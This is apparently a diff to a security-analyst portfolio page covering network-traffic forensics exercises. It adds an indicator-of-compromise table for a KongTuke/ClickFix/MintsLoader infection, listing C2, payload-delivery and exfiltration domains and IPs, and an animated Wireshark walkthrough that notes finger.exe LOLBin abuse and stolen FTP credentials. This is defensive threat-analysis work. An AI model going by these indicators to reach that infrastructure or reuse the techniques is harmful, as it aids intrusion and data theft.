+        <text x="26" y="709" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568">Victim</text>
+        <rect x="80" y="700" width="10" height="10" fill="#ffa502" rx="1"/>
+        <text x="96" y="709" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568">Init. vector</text>
+        <rect x="170" y="700" width="10" height="10" fill="#ff4757" rx="1"/>
+        <text x="186" y="709" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568">C2 / Recon</text>
+        <text x="160" y="730" font-family="'JetBrains Mono',monospace" font-size="9" fill="#1e2d3d" text-anchor="middle">Hover each step for full details</text>
+      </svg>
+    </div>
+  </div>
+
 </section>
-  <div class="section-header"><span class="section-num">04</span><h2>Tools & Methods</h2><div class="section-line"></div></div>
+
+<section id="tools">
+  <div class="section-header"><span class="section-num">04</span><h2>Tools &amp; Methods</h2><div class="section-line"></div></div>
   <div class="tools-grid">
     <div class="tool-card fade-in"><div class="tool-icon">&gt;_</div><div class="tool-name">Wireshark</div><div class="tool-desc">Protocol hierarchy, conversation analysis, stream following, display filters</div></div>
     <div class="tool-card fade-in" style="transition-delay:0.1s"><div class="tool-icon">[N]</div><div class="tool-name">NetworkMiner</div><div class="tool-desc">Host discovery, credential extraction, session reconstruction</div></div>
@@ -668,6 +770,7 @@ html,body{max-width:100%;overflow-x:hidden;}
     <div class="ioc-filter" onclick="filterIOC('2026-02-28',this)">2026-02-28</div>
     <div class="ioc-filter" onclick="filterIOC('2026-01-31',this)">2026-01-31</div>
     <div class="ioc-filter" onclick="filterIOC('2026-02-03',this)">2026-02-03</div>
+    <div class="ioc-filter" onclick="filterIOC('2026-02-02',this)">2026-02-02</div>
   </div>
   <table class="ioc-table">
     <thead><tr><th>INDICATOR</th><th>TYPE</th><th>ROLE</th><th>EXERCISE</th></tr></thead>
@@ -692,6 +795,22 @@ html,body{max-width:100%;overflow-x:hidden;}
       <tr data-ex="2026-02-03"><td class="ioc-val" data-label="INDICATOR">208.95.112.1</td><td data-label="TYPE"><span class="ex-badge badge-high">IP</span></td><td class="ioc-role" data-label="ROLE">ip-api.com hosting IP — Reconnaissance target</td><td class="ioc-ex" data-label="EXERCISE">2026-02-03</td></tr>
       <tr data-ex="2026-02-03"><td class="ioc-val" data-label="INDICATOR">ftp.corwineagles.com</td><td data-label="TYPE"><span class="ex-badge badge-critical">DOMAIN</span></td><td class="ioc-role" data-label="ROLE">FTP Exfiltration server — passwords + Thunderbird contacts stolen</td><td class="ioc-ex" data-label="EXERCISE">2026-02-03</td></tr>
       <tr data-ex="2026-02-03"><td class="ioc-val" data-label="INDICATOR">162.241.123.75</td><td data-label="TYPE"><span class="ex-badge badge-critical">IP</span></td><td class="ioc-role" data-label="ROLE">FTP Exfiltration server IP — corwineagles.com (likely compromised)</td><td class="ioc-ex" data-label="EXERCISE">2026-02-03</td></tr>
+      <!-- 2026-02-02 KongTuke IOCs -->
+      <tr data-ex="2026-02-02"><td class="ioc-val" data-label="INDICATOR">oceanbistrooumc.com</td><td data-label="TYPE"><span class="ex-badge badge-high">DOMAIN</span></td><td class="ioc-role" data-label="ROLE">Initial infection — ClickFix fake CAPTCHA page (DGA domain, 3 months old)</td><td class="ioc-ex" data-label="EXERCISE">2026-02-02</td></tr>
+      <tr data-ex="2026-02-02"><td class="ioc-val" data-label="INDICATOR">35.212.49.138</td><td data-label="TYPE"><span class="ex-badge badge-high">IP</span></td><td class="ioc-role" data-label="ROLE">Google LLC IP hosting oceanbistrooumc.com ClickFix page</td><td class="ioc-ex" data-label="EXERCISE">2026-02-02</td></tr>
+      <tr data-ex="2026-02-02"><td class="ioc-val" data-label="INDICATOR">soulversr.com</td><td data-label="TYPE"><span class="ex-badge badge-critical">DOMAIN</span></td><td class="ioc-role" data-label="ROLE">Drive-by payload delivery — KongTuke malware (ThreatFox confirmed)</td><td class="ioc-ex" data-label="EXERCISE">2026-02-02</td></tr>
+      <tr data-ex="2026-02-02"><td class="ioc-val" data-label="INDICATOR">216.245.184.175</td><td data-label="TYPE"><span class="ex-badge badge-critical">IP</span></td><td class="ioc-role" data-label="ROLE">KongTuke delivery server IP — soulversr.com</td><td class="ioc-ex" data-label="EXERCISE">2026-02-02</td></tr>
+      <tr data-ex="2026-02-02"><td class="ioc-val" data-label="INDICATOR">144.31.238.37</td><td data-label="TYPE"><span class="ex-badge badge-critical">IP</span></td><td class="ioc-role" data-label="ROLE">LOLBin C2 — finger.exe payload source (ClickFix command execution)</td><td class="ioc-ex" data-label="EXERCISE">2026-02-02</td></tr>
+      <tr data-ex="2026-02-02"><td class="ioc-val" data-label="INDICATOR">85.137.253.64</td><td data-label="TYPE"><span class="ex-badge badge-critical">IP</span></td><td class="ioc-role" data-label="ROLE">C2 Stage 1 — Python/Werkzeug server delivering main.ps1 + wgr.ps1</td><td class="ioc-ex" data-label="EXERCISE">2026-02-02</td></tr>
+      <tr data-ex="2026-02-02"><td class="ioc-val" data-label="INDICATOR">sbwur1.top</td><td data-label="TYPE"><span class="ex-badge badge-critical">DOMAIN</span></td><td class="ioc-role" data-label="ROLE">MintsLoader Stage 2 — 52 KB obfuscated PowerShell payload</td><td class="ioc-ex" data-label="EXERCISE">2026-02-02</td></tr>
+      <tr data-ex="2026-02-02"><td class="ioc-val" data-label="INDICATOR">gecdfcjcbcmmakk.top</td><td data-label="TYPE"><span class="ex-badge badge-critical">DOMAIN</span></td><td class="ioc-role" data-label="ROLE">MintsLoader Stage 3 — victim registration + 298 KB payload delivery</td><td class="ioc-ex" data-label="EXERCISE">2026-02-02</td></tr>
+      <tr data-ex="2026-02-02"><td class="ioc-val" data-label="INDICATOR">64.52.80.153</td><td data-label="TYPE"><span class="ex-badge badge-critical">IP</span></td><td class="ioc-role" data-label="ROLE">BL Networks IP — hosting sbwur1.top + gecdfcjcbcmmakk.top (MintsLoader)</td><td class="ioc-ex" data-label="EXERCISE">2026-02-02</td></tr>
+      <tr data-ex="2026-02-02"><td class="ioc-val" data-label="INDICATOR">api.ipify.org</td><td data-label="TYPE"><span class="ex-badge badge-high">DOMAIN</span></td><td class="ioc-role" data-label="ROLE">Reconnaissance — victim Public IP lookup (x2 contacts)</td><td class="ioc-ex" data-label="EXERCISE">2026-02-02</td></tr>
+      <tr data-ex="2026-02-02"><td class="ioc-val" data-label="INDICATOR">104.26.12.205</td><td data-label="TYPE"><span class="ex-badge badge-high">IP</span></td><td class="ioc-role" data-label="ROLE">Cloudflare IP hosting api.ipify.org — Reconnaissance</td><td class="ioc-ex" data-label="EXERCISE">2026-02-02</td></tr>
+      <tr data-ex="2026-02-02"><td class="ioc-val" data-label="INDICATOR">checkip.dyndns.org</td><td data-label="TYPE"><span class="ex-badge badge-high">DOMAIN</span></td><td class="ioc-role" data-label="ROLE">Reconnaissance — alternative Public IP check service</td><td class="ioc-ex" data-label="EXERCISE">2026-02-02</td></tr>
+      <tr data-ex="2026-02-02"><td class="ioc-val" data-label="INDICATOR">132.226.8.169</td><td data-label="TYPE"><span class="ex-badge badge-high">IP</span></td><td class="ioc-role" data-label="ROLE">Oracle Cloud IP hosting checkip.dyndns.org</td><td class="ioc-ex" data-label="EXERCISE">2026-02-02</td></tr>
+      <tr data-ex="2026-02-02"><td class="ioc-val" data-label="INDICATOR">ipinfo.io</td><td data-label="TYPE"><span class="ex-badge badge-high">DOMAIN</span></td><td class="ioc-role" data-label="ROLE">Geo-Reconnaissance — city + region + country profiling of victim</td><td class="ioc-ex" data-label="EXERCISE">2026-02-02</td></tr>
+      <tr data-ex="2026-02-02"><td class="ioc-val" data-label="INDICATOR">34.117.59.81</td><td data-label="TYPE"><span class="ex-badge badge-high">IP</span></td><td class="ioc-role" data-label="ROLE">Google Cloud IP hosting ipinfo.io — Geo-Reconnaissance</td><td class="ioc-ex" data-label="EXERCISE">2026-02-02</td></tr>
     </tbody>
   </table>
 </section>
@@ -728,17 +847,17 @@ document.querySelectorAll('.fade-in').forEach(function(el){
 
 (function(){
   var lines=[
-    {type:'cmd',text:'wireshark -r 2026-02-03.pcap', pause:400},
+    {type:'cmd',text:'wireshark -r 2026-02-02.pcap', pause:400},
     {type:'out',text:'Opening capture file...',cls:'t-green', pause:300},
-    {type:'cmd',text:'http.request and ip.src == 10.2.3.101', pause:400},
-    {type:'out',text:'1 packet matched filter', pause:300},
-    {type:'out',text:'WARNING: GET /line/?fields=hosting → ip-api.com',cls:'t-amber', pause:900},
-    {type:'cmd',text:'// Check HTTPS before 16:13:59', pause:500},
-    {type:'out',text:'drive.usercontent.google.com — 270 kB download!',cls:'t-amber', pause:900},
-    {type:'cmd',text:'ftp or ftp-data', pause:400},
-    {type:'out',text:'USER: edunis@corwineagles.com',cls:'t-red', pause:600},
-    {type:'out',text:'STOR PW_tyler-DESKTOP-W7F98GR...html',cls:'t-red', pause:900},
-    {type:'out',text:'COMPROMISED: DESKTOP-W7F98GR | tyler',cls:'t-red', pause:1800},
+    {type:'cmd',text:'http.request and ip.src == 10.2.2.37', pause:400},
+    {type:'out',text:'Protocol: FINGER detected!',cls:'t-amber', pause:600},
+    {type:'out',text:'WARNING: LOLBin abuse via finger.exe',cls:'t-amber', pause:900},
+    {type:'cmd',text:'tls.handshake.type == 1', pause:500},
+    {type:'out',text:'oceanbistrooumc.com — DGA domain!',cls:'t-amber', pause:900},
+    {type:'cmd',text:'// ThreatFox lookup: 64.52.80.153', pause:400},
+    {type:'out',text:'MintsLoader C2 confirmed',cls:'t-red', pause:600},
+    {type:'out',text:'sbwur1.top + gecdfcjcbcmmakk.top',cls:'t-red', pause:900},
+    {type:'out',text:'COMPROMISED: 10.2.2.37 | KongTuke active',cls:'t-red', pause:1800},
   ];
   var t=document.getElementById('terminal-output');
   if(!t) return;
@@ -750,7 +869,6 @@ document.querySelectorAll('.fade-in').forEach(function(el){
   function run(){
     if(li>=lines.length){
       setTimeout(function(){
-        // force reflow before fade out — fixes inconsistency on mobile
         t.style.transition='none';
         t.style.opacity='1';
         void t.offsetHeight;
@@ -800,7 +918,6 @@ document.querySelectorAll('.fade-in').forEach(function(el){
   setTimeout(run,1000);
 })();
 
-// Chain tabs — use class only, no inline display style
 function switchChain(id,btn){
   document.querySelectorAll('.chain-panel').forEach(function(p){
     p.classList.remove('active');
@@ -808,7 +925,7 @@ function switchChain(id,btn){
   document.querySelectorAll('.chain-tab:not(.disabled)').forEach(function(t){t.classList.remove('active');});
   var panel=document.getElementById('chain-'+id);
   if(panel){panel.classList.add('active');}
-  btn.classList.add('active');
+  if(btn) btn.classList.add('active');
 }
 
 var tipVisible=false;
